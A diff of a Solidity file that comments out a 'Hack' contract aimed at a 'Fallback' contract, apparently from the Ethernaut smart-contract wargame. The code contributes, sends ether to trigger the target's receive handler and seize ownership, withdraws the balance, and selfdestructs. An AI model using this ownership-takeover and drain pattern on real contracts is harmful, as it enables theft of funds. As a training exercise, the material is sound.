@@ -41,27 +41,27 @@ contract Fallback {
   }
 }
 
-// contract Hack{
-    Fallback private immutable _fallback;
-    constructor(address payable __fallback){
-        _fallback=Fallback(__fallback);
+// // contract Hack{
+//     Fallback private immutable _fallback;
+//     constructor(address payable __fallback){
+//         _fallback=Fallback(__fallback);
         
-    }
-    function attack()external payable{
-         _fallback.contribute{value:msg.value}();
+//     }
+//     function attack()external payable{
+//          _fallback.contribute{value:msg.value}();
         
-    }
-    function newoner()external payable{
-      (bool success,)=address(payable(_fallback)).call{value:msg.value}("");
-      require(success);
+//     }
+//     function newoner()external payable{
+//       (bool success,)=address(payable(_fallback)).call{value:msg.value}("");
+//       require(success);
      
-    }
-    function withdraw()external{
-      _fallback.withdraw();
-    }
-    receive() external payable { }
-    function transferMoney()external {
-      selfdestruct(payable(msg.sender));
-    }
+//     }
+//     function withdraw()external{
+//       _fallback.withdraw();
+//     }
+//     receive() external payable { }
+//     function transferMoney()external {
+//       selfdestruct(payable(msg.sender));
+//     }
   
-}
+// }
